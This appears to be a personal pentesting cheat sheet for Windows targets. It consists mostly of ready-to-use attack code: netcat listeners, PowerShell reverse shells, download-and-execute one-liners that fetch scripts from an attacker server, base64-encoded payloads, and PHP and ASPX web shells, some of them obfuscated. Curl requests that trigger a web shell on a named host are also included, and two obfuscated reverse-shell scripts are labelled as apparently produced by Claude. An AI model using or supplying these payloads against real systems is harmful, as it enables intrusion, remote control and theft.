```sh
rlwrap nc -lvnp 4444 # op listener (arrow keys)
nc -lvnp 4444 # normal listener
```
# **Windows**
### Reverse shells
**Kali**
```sh
cp /usr/share/windows-binaries/nc.exe . # netcat

cp /usr/share/nishang/Shells/Invoke-PowerShellIcmp.ps1 shell.ps1 # nishang
Invoke-PowerShellTcp -Reverse -IPAddress 10.63.165.64 -Port 9001 # must append

wget https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1 # Invoke-ConPtyShell

PAYLOAD='$c=New-Object System.Net.Sockets.TCPClient("10.63.165.73",443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s2=([text.encoding]::ASCII).GetBytes($r);$s.Write($s2,0,$s2.Length);$s.Flush()}'
echo -n "$PAYLOAD" | iconv -t UTF-16LE | base64 -w0 # encode PS payload

```
**Windows**
```powershell
ping -n 1 10.10.15.173
nc.exe -e cmd.exe 10.63.165.73 4444 # netcat

IEX(New-Object Net.WebClient).DownloadString('http://10.63.165.73:8080/shell.ps1'); Invoke-ConPtyShell 10.63.165.73 9001 # Invoke-ConPtyShell

powershell -enc "enc string" # decode payload

IEX(New-Object Net.WebClient).DownloadString('http://ip/shell.ps1') # download and execute
```
### Webshells
**Kali**
```sh
cp /usr/share/webshells/ # simple backdoor is good

<?php $f=base64_decode('c3lzdGVt');$f($_GET['c']); ?> # obfuscated web shell

<?php
echo "<pre>";
// Check if the parameter exists
if (isset($_REQUEST['cmd'])) {
    $cmd = $_REQUEST['cmd'];
    $output = "";
   
    // Fallback 1: system()
    if (function_exists('system')) {
        ob_start();
        system($cmd);
        $output = ob_get_clean();
    }
    // Fallback 2: shell_exec()
    elseif (function_exists('shell_exec')) {
        $output = shell_exec($cmd);
    }
    // Fallback 3: passthru()
    elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd);
        $output = ob_get_clean();
    }
    // Fallback 4: backticks
    elseif (function_exists('popen')) {
        $handle = popen($cmd, 'r');
        $output = stream_get_contents($handle);
        pclose($handle);
    }
    else {
        $output = "All execution functions are disabled!";
    }
   
    echo htmlspecialchars($output);
} else {
    echo "Usage: ?cmd=whoami";
}
echo "</pre>";
?> # even more obfuscated webshell

curl -k "https://$IP/viren/ops/s.php?c=powershell+-nop+-ep+bypass+-f+C:\xampp\htdocs\viren\ops\shell.ps1"

curl -sk "https://1viren.cyber.curtin.io/viren/ops/s.php" --data-urlencode "c=powershell -enc blob" -G

# ASPX test execution
cat > test.aspx <<'EOF'
<%@ Page Language="C#" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{
  Response.Write("EXEC OK");
}
</script>
EOF

# ASPX webshell - cmd.aspx?cmd=whoami
cat > cmd.aspx <<'EOF'
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server"> 
protected void Page_Load(object sender, EventArgs e)
{
  string cmd = Request["cmd"];
  if (String.IsNullOrEmpty(cmd)) { Response.Write("OK"); return; }
  Process p = new Process();
  p.StartInfo.FileName = "cmd.exe";
  p.StartInfo.Arguments = "/c " + cmd;
  p.StartInfo.UseShellExecute = false;
  p.StartInfo.RedirectStandardOutput = true;
  p.StartInfo.RedirectStandardError = true;
  p.StartInfo.CreateNoWindow = true;
  p.Start();
  Response.Write("<pre>");
  Response.Write(Server.HtmlEncode(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd()));
  Response.Write("</pre>");
}
</script>
EOF

?cmd=powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://10.63.165.73:8080/shell.ps1')" # upgrade to revshell
```

#### PS payloads
**One liner**
```powershell
$sm=(New-Object Net.Sockets.TCPClient("10.10.17.1",1337)).GetStream(); [byte[]]$bt=0..65535|%{0}; while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i); $st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1)); $sm.Write($st,0,$st.Length)}
```
#### Obfuscated shell.ps1
**Claude**
```powershell
$h='10.63.165.73'; $p=4444
$t='Sys'+'tem.Net.Sockets.TCPCl'+'ient'
$client=New-Object $t($h,$p)
$stream=$client.GetStream()
[byte[]]$bytes=0..65535|%{0}
while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){
    $data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback=(&([scriptblock]::Create($data)) 2>&1|Out-String)
    $sendback2=$sendback+'PS '+(pwd).Path+'> '
    $sendbyte=([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```
**Jo's Claude**
```powershell
$h='10.63.165.73'; $p=4444
$t='Sys'+'tem.Net.Sockets.TCPCl'+'ient'
$client=New-Object $t($h,$p)
$stream=$client.GetStream()
[byte[]]$bytes=0..65535|%{0}
while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){
    $data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback=(&([scriptblock]::Create($data)) 2>&1|Out-String)
    $sendback2=$sendback+'PS '+(pwd).Path+'> '
    $sendbyte=([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```